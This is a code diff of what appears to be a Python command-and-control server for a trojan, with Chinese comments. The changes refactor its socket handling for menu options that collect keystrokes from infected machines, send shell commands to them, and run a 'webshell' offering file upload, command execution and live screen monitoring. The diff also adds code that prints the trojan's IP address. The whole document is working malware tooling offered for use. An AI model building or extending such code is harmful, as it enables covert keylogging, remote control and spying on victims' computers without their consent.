@@ -58,16 +58,14 @@ def socket_main():
         sys.exit(1)       
     print("waiting......")
 
-def socket_service():
-    s = socket_main()
+def socket_service(s):
     while 1:
         console,addr = s.accept()
         # 增加线程，增加并发
         t = threading.Thread(target=deal_data,args=(console,addr))
         t.start()
 #监听键盘方法        
-def listen_keyboard():
-    s = socket_main()
+def listen_keyboard(s):
     while True:
         console,addr = s.accept()
         while True:
@@ -77,8 +75,7 @@ def listen_keyboard():
                 break
 
 #命令行控制方法
-def cmdContorl():
-    s=socket_main()
+def cmdContorl(s):
     while 1:
         cmd = input('操作命令行>>')
         client,addr = s.accept()
@@ -87,8 +84,8 @@ def cmdContorl():
         print("{}".format(data.decode('utf-8')))
     
 #webshell控制
-def webshell():
-    s=socket_main()
+def webshell(s):
+    # s=socket_main()
     client,addr = s.accept()
     print("webshell")
     while True:
@@ -96,9 +93,17 @@ def webshell():
         if not port.strip().isdigit():
             continue
         else:
+            # print(addr)
             print('提示1：/是上传程序,提示2:/cmd?参数(cmd或者dir),提示3:/screenshot是实时监控屏幕')
             print('')
             client.send(port.encode())
+            while 1:
+                ipaddr = client.recv(1024)
+                print("木马ip为:")
+                print(ipaddr.decode('utf-8'))
+                if ipaddr:
+                    break
+                
             client.close()
             s.close()
             break
@@ -115,17 +120,18 @@ if __name__ == "__main__":
         select = input("请输入>>>>.")
         if int(select) in opation:
             client.send(select.encode())
-            client.close()
+            # client.close()
             break
         else:
-            s.close()
-            pass    
-    s.close()       
+            print('请选有的操作')
+            # s.close()
+            continue    
+    # s.close()       
     if select==str(1):
-        socket_service()
+        socket_service(s)
     elif select==str(2):
-        listen_keyboard()
+        listen_keyboard(s)
     elif select==str(3):
-        cmdContorl()
+        cmdContorl(s)
     elif select==str(4):
-        webshell()                    
+        webshell(s)                    
